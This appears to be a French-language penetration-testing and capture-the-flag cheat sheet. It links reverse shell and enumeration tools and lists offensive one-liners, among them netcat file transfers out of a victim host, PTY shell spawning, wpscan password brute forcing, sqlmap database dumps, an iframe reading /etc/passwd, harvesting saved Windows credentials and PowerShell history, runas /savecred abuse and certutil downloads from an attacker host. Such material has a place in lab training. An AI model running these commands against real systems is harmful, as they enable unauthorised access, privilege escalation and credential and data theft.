```
===========================================

_______________________________ /\ 
\_   ___ \__    ___/\_   _____/ )/______
/    \  \/ |    |    |    __)    /  ___/
\     \____|    |    |     \     \___ \ 
 \______  /|____|    \___  /    /____  >
        \/               \/          \/ 

============================================
```
# Énumeration

[ENUM] linPEAS : https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS <br>
[ENUM] winPEAS : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat (.bat) <br>

# Objectif Reverse shell !

[SHELL] Netcat for windows : https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip <br>
[SHELL] Hacker tools : https://addons.mozilla.org/en-US/firefox/addon/hacktools/ <br>
[SHELL] Reverse Shells : https://www.revshells.com/ <br>
[SHELL] Reverse shell php : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <br>

# Utiles

[MISC] subdomains.txt : https://raw.githubusercontent.com/danTaler/WordLists/master/Subdomain.txt <br>
[MISC] Bypass authentication : https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass <br>
[MISC] PAYLOADSALLTHETHINGS : https://github.com/swisskyrepo/PayloadsAllTheThings (reverse shell, etc...) <br>
[MISC] Binaries exploit : https://gtfobins.github.io/ <br>


-------------------------------------------------------------------------------------------------------------------------------------------+
# Basiques !
```
[+] => INFO GATHERING           - sudo -l
[+] => SPAWN SHELL USING PYTHON - python3 -c 'import pty; pty.spawn("/bin/sh")'
[+] => SPAWN SHELL USING BASH   - bash -i
[+] => TRANSFER FILE VIA NETCAT - [victime] nc -nv <ip> 1337 < <file_to_transfer> | [attacker] nc -lnvp 1337 > <file_to_transfer>
```
-------------------------------------------------------------------------------------------------------------------------------------------+
# Linux
```
[CMD](JS)        => <iframe src=file:///etc/passwd></iframe>
[CMD](WordPress) => wpscan => ex (brute force mdp) wpscan --url 10.10.180.74/blog -U admin -P /usr/share/wordlists/rockyou.txt
[CMD](misconfig) => bash -p
[CMD](BINARIES)  => find / -user root -perm -4000 -exec ls -ldb {} \;
[CMD](GOBUSTER)  => gobuster dir -u <url> -w=/usr/share/wordlists/dirb.../<list> -b <status_code_to_exclude>
[CMD](NMAP/SMB)  => nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP  (SAMBA)
                    smbclient //<ip>/anonymous (-U pour un utilisateurs)
                    smbget -R smb://<ip>/anonymous
[CMD](FFUF)      => ffuf -c -w /usr/share/wordlists/subdomains.txt -u http://domain.com/ -H "Host: FUZZ.domain.com" -fc 301
[CMD](list)      => msfvenom -l payloads | grep windows | grep reverse | grep shell  (exemple)
[CMD](decrypt)   => john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=<format>
[CMD](sql)       => sqlmap -r file.txt --dbms=mysql --dump | (après avoir copier une requête Burp dans un fichier txt)
[CMD](ftp)       => wget -m --no-passive ftp://anonymous:anonymous@<IP>  (download tout)
```
# Windows


```
[RDP]            => xfreerdp /d:<domain> /u:'<user>' /p:'<password>' /v:<prefix>.<domain> /drive:.,kali-share +clipboard

[CMD](WIN)*PS*   => Invoke-WebRequest -Uri "http://<ip>:<port>/<file>" -Outfile <outfile>
[CMD](WIN)*PS*   => Expand-Archive <file.zip>
[CMD](WIN)*PS*   => type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (ou %userprofile% avec CMD)
[CMD](WIN)*PS*   => cmdkey /list  #liste les creds sauvegardés
[CMD](WIN)*PS*   => runas /savecred /user:admin cmd.exe  #exécute l'action avec les credentials sauvegardés
[CMD](AD)*PS*    => Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose

[CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
```
# Windows IIS Configuration
![image](https://user-images.githubusercontent.com/97956863/231268829-26242927-066f-47be-a4c4-cab613374d7f.png)

```

```


-------------------------------------------------------------------------------------------------------------------------------------------+
<br>
[?] Using "-p" on an SUID file will run it with the permission of the owner. Ex if root own a file and you run it (non-root) using "-p" you will run it with root perm
